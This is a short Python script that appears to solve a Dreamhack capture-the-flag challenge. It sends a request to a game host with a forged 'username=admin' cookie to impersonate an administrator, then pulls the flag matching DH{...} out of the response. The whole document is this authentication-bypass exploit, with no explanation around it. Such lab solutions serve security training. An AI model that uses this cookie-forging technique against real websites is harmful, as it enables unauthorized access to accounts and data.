import requests
import re

host = 'http://host3.dreamhack.games:8356/'
headers = {
    'Cookie': 'username=admin'
}

flag = requests.get(host, headers=headers)
print(re.search(r'DH{.*?}', flag.text).group())